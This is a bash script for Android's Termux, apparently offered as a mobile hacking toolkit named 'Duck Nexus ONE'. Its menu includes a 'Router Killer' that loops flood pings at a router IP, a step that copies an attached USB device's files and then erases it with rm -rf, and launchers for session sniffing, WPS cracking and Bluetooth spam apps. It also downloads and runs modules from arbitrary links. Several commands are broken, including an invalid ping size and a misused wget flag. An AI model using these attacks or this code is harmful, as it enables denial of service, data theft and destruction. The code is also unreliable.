#!/data/data/com.termux/files/usr/bin/bash
termux-wake-lock
MODULES="/data/data/com.termux/files/usr/share/ducknexus/modules"
if [[ "$(ls $MODULES 2>/dev/null)" = "" ]]; then
mkdir -p $MODULES
fi
echo "Duck Nexus ONE" | lolcat
echo "Make sure you have the following apps installed: UniMote, Mi Remote (required only in IR supported phones), Screen Mirroring - TV Miracast, PandwaRF, DroidSheep, PentestKit Mobile, Bluetooth LE Spam, WPSApp and Termux-API (with all permissions granted)."
read -p "Home
[1] TV Remote Control (WiFi Required)
[2] Universal Device Remote Control (IR Required)
[3] Mirror phone on TV (WiFi Required)
[4] Frequency Analyzer (PandwaRF Required)
[5] Router Killer (WiFi Required)
[6] Pentester's Kit
[7] Sniff Network (Root Required)
[8] Copy device files (OTG & Root Required)
[9] Brute force frequencies (IR Required)
[10] Bluetooth Spam (Bluetooth Required)
[11] WPS Hack (WiFi Required)
[12] Change others phone bright (Auto Bright Required)
[13] Create/Edit a Custom module
[14] Download a Custom module (WiFi Required)
[15] Use a Custom module
[16] Send custom Infrared (IR Required)
[17] Delete a Custom module
" choice
if [[ "$choice" = "1" ]]; then
am start -n sensustech.universal.tv.remote.control/sensustech.universal.tv.remote.control.activities.SplashActivity
elif [[ "$choice" = "2" ]]; then
am start -n com.duokan.phone.remotecontroller/com.xiaomi.mitv.phone.remotecontroller.HoriWidgetMainActivityV2
elif [[ "$choice" = "3" ]]; then
am start -n com.studiosoolter.screenmirroring.miracast.apps/com.studiosoolter.screenmirroring.miracast.apps.activities.SplashActivity
elif [[ "$choice" = "4" ]]; then
am start -n com.comthings.pandwarf/com.comthings.gollum.app.gollumtest.rfsub1gApp.activities.GollumSplashActivity
elif [[ "$choice" = "5" ]]; then
read -p "Router IP: " ip
while true
do
ping -t 255 -s 1569325055 -f $ip &
done
elif [[ "$choice" = "6" ]]; then
am start -n com.pentestkit/com.pentestkit.MainActivity
elif [[ "$choice" = "7" ]]; then
am start -n de.trier.infsec.koch.droidsheep/de.trier.infsec.koch.droidsheep.activities.ListenActivity
elif [[ "$choice" = "8" ]]; then
usb=$(ls /storage | tr -d 'emulated')
cp -r /storage/$usb ~/duckph
echo "Device files copied to ~/duckph. Press Enter to erase device, Ctrl+C to not erase."
read a
cd /storage/$usb && rm -rf *
elif [[ "$choice" = "9" ]]; then
echo "Point your device to the target."
num=0
while true
do
num=$(($num + 1))
termux-infrared-transmit -f $num 50,50,50,50
done
elif [[ "$choice" = "10" ]]; then
am start -n de.simon.dankelmann.bluetoothlespam/de.simon.dankelmann.bluetoothlespam.MainActivity
elif [[ "$choice" = "11" ]]; then
am start -n com.themausoft.wpsapp/com.themausoft.wpsapp.InitActivity
elif [[ "$choice" = "12" ]]; then
echo "Please know that Auto Bright is Required only on Target phone. This option may not work on every phones. This option will only change the bright of the other phone to a major bright, So, You can not control what bright will be set to the other phone. Now, Point your lantern to the other phone, Press Ctrl+C to cancel or Enter to continue."
read blabla1
termux-torch on
echo "Press Enter to stop."
read blabla2
termux-torch off
elif [[ "$choice" = "13" ]]; then
read -p "Module file name: " name
echo "How to use: Write your module, Then press Ctrl+X, Type Y, And click Enter."
echo "Please, use a shebang if you will not use Bash!"
read -p "Press Enter to continue." blabla3
nano /data/data/com.termux/files/usr/share/ducknexus/modules/$name
chmod +x $MODULES/$name
termux-fix-shebang $MODULES/$name
elif [[ "$choice" = "14" ]]; then
read -p "Link of module: " link1
read -p "Name of module: " name1
wget $link1 -o $MODULES/$name1
elif [[ "$choice" = "15" ]]; then
if [[ "$(ls $MODULES)" = "" ]]; then
echo "There are no modules."
else
echo "Custom modules:"
ls $MODULES
read -p "Module file name to use: " name2
$MODULES/$name2
fi
elif [[ "$choice" = "16" ]]; then
echo "Help: Transmit an infrared pattern. The pattern is specified in comma-separated on/off intervals, such as '20,50,20,30'. Only patterns shorter than 2 seconds will be transmitted. Example: 00000 (IR Frequency in Hertz) 0,0,0,0 (Pattern)"
read -p "Infrared to transmit: " infra1
termux-infrared-transmit -f $infra1
elif [[ "$choice" = "17" ]]; then
echo "Due to critical errors, modules will not be shown in this option."
read -p "Module to delete: " name3
rm $MODULES/$name3
else
echo "Unknown option."
fi
